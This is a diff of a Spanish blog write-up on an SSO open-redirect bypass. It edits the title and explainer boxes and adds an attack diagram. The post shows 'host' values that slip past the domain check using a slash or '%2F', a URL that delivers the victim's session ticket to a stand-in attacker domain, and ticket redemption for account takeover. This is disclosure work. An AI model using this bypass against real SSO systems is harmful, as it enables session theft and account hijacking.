@@ -1,5 +1,5 @@
 ---
-title:       "No era un open redirect: era la sesión de la víctima saliendo por la puerta"
+title:       "Toma de cuenta con un clic: el open redirect del SSO entregaba el ticket de sesión"
 summary:     "Un parámetro `host` del SSO aceptaba dominios ajenos si les pegabas una barra en el sitio justo. Lo que se iba al dominio del atacante no era al usuario: era su ticket de sesión. Un clic y la cuenta cambia de dueño."
 date:        2026-11-11 20:10:00 +0100
 lang:        es
@@ -44,11 +44,7 @@ Para saber a dónde devolverte, el SSO acepta un parámetro en la URL:
 https://sso.ejemplo.tld/doLogin?host=app.ejemplo.tld
 ```
 
-<div class="plain" markdown="1">
-**En cristiano:** `host` es el «¿a dónde te mando cuando termines?». Es un parámetro que
-viaja en el enlace, así que lo escribe quien hace el enlace. Y quien hace el enlace puede
-ser cualquiera.
-</div>
+Ese parámetro viaja en el enlace, así que lo escribe quien hace el enlace. Y quien hace el enlace puede ser cualquiera.
 
 ## Primer intento: rechazado (y eso es buena noticia)
 
@@ -61,12 +57,10 @@ https://sso.ejemplo.tld/doLogin?host=atacante-ejemplo.com
 Respuesta: **rechazado**, con un código de error interno. El servidor no se traga cualquier
 cosa.
 
-<div class="plain" markdown="1">
-**En cristiano:** aquí mucha gente cierra la pestaña y se va. Yo hago lo contrario: que
+Aquí mucha gente cierra la pestaña y se va. Yo hago lo contrario: que
 **rechace** significa que hay un control, y un control es algo que se puede **estudiar**.
 Si me hubiera aceptado el dominio a la primera, sería un fallo trivial. Que me rechace
 convierte la pregunta en una mucho mejor: *¿qué regla exacta está aplicando?*
-</div>
 
 Y esa pregunta es la que paga.
 
@@ -92,15 +86,13 @@ Mira estos tres valores y piensa dónde acaba el usuario:
   <figcaption>El navegador corta en la primera barra. La comprobación mira la cadena entera. Ahí está el hueco.</figcaption>
 </figure>
 
-<div class="plain" markdown="1">
-**En cristiano:** el navegador decide el destino con lo que hay **antes de la primera
+El navegador decide el destino con lo que hay **antes de la primera
 barra**. Todo lo que viene después es la ruta, el «dentro de» ese sitio. Así que
 `atacante.com/.marca.com` es una página llamada `.marca.com` dentro del servidor del
 atacante.
 
 Pero si el servidor solo mira si el texto *contiene* `.marca.com`... lo contiene. Pasa el
 control. Y te manda a casa del atacante.
-</div>
 
 El `%2F` del tercer ejemplo es la barra escrita en código de URL. El servidor la
 **decodifica** antes de comparar y antes de construir la redirección, así que acaba siendo
@@ -130,14 +122,12 @@ ticket se fue, entero, al dominio del atacante:
 https://atacante-ejemplo.com/.marca-ejemplo.com?ticket=a1b2c3d4e5f6...
 ```
 
-<div class="plain" markdown="1">
-**En cristiano:** imagina que el portero del edificio, en vez de acompañarte a tu piso, le
+Imagina que el portero del edificio, en vez de acompañarte a tu piso, le
 da **la llave** a quien le diga una dirección parecida a la tuya. No es que te haya mandado
 al sitio equivocado: es que ha entregado la llave por el camino.
 
 Y como el atacante controla ese servidor, lee el ticket en su propio registro de accesos.
 Ni siquiera necesita que la víctima haga nada más.
-</div>
 
 ## El caso de un solo clic
 
@@ -147,6 +137,12 @@ las cookies, da por buena la identidad y emite el ticket **directamente**.
 
 La víctima hace **un clic** en un enlace cuyo dominio visible es el del fabricante de
 verdad. No escribe contraseña. No ve nada raro. Y el ticket ya está en manos del atacante.
+
+<figure>
+  <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena.svg' | relative_url }}"
+       alt="Diagrama de los cinco pasos: la víctima abre el enlace, el SSO emite el ticket sin pedir contraseña, la redirección lo lleva al dominio del atacante, este lo lee en su log y lo canjea desde una sesión limpia">
+  <figcaption>Cinco pasos y una sola acción de la víctima. Lo que viaja en la redirección es una credencial.</figcaption>
+</figure>
 
 ## Canjear el ticket
 
@@ -189,11 +185,9 @@ sessionId: <el de la víctima>
 Y devolvió sus datos personales **en claro**, incluido el correo completo — mientras que
 la propia aplicación, en su interfaz, lo enseña enmascarado.
 
-<div class="plain" markdown="1">
-**En cristiano:** la aplicación te muestra `j***@gmail.com` porque considera que el correo
+La aplicación te muestra `j***@gmail.com` porque considera que el correo
 es un dato sensible. La API lo devuelve entero. Esa diferencia es la prueba de que lo que
 tengo en la mano no es «una sesión cualquiera»: es **la identidad de esa persona**.
-</div>
 
 Y ahí paré. No toqué dispositivos, no modifiqué nada, no entré en nada que no fuera la
 cuenta de prueba.
@@ -208,12 +202,10 @@ Tres contrapruebas, y la primera es la que de verdad importa:
 | Mismo endpoint con un identificador de sesión **inventado** | `401` | Que la API respondiera a cualquiera |
 | Mismo endpoint **sin** identificador de sesión | `401` | Que esos datos fueran públicos |
 
-<div class="plain" markdown="1">
-**En cristiano:** la primera fila es la joya del reporte. Demuestra que el servidor
+La primera fila es la joya del reporte. Demuestra que el servidor
 **valida** ese parámetro, y que lo único que cambia entre un rechazo y un robo de sesión es
 **una barra**. Eso convierte «he puesto mi dominio y funcionó» en «he encontrado cómo
 saltarme vuestro control». Son dos reportes muy distintos a ojos de quien los tría.
-</div>
 
 ## Un regalo extra: la cookie que anulaba la protección
 
@@ -221,14 +213,7 @@ Mirando las cookies que se establecían al canjear el ticket, vi que una de ella
 **el mismo identificador de sesión en claro** y, a diferencia de la principal, **sin la
 marca `HttpOnly`**.
 
-<div class="plain" markdown="1">
-**En cristiano:** `HttpOnly` es una etiqueta que le dice al navegador *«este valor no se lo
-enseñes a JavaScript»*. Sirve para que un fallo de tipo XSS no pueda robar la sesión.
-
-Pero si el **mismo** identificador viaja también en una segunda cookie sin esa etiqueta, la
-protección de la primera no vale nada: cualquier script lo lee de la otra. Es cerrar una
-puerta con llave y dejar la ventana de al lado abierta.
-</div>
+Si el **mismo** identificador viaja también en una segunda cookie sin esa marca, la protección de la primera no vale nada: cualquier script lo lee de la otra. Es cerrar una puerta con llave y dejar la ventana de al lado abierta.
 
 ## Impacto
 
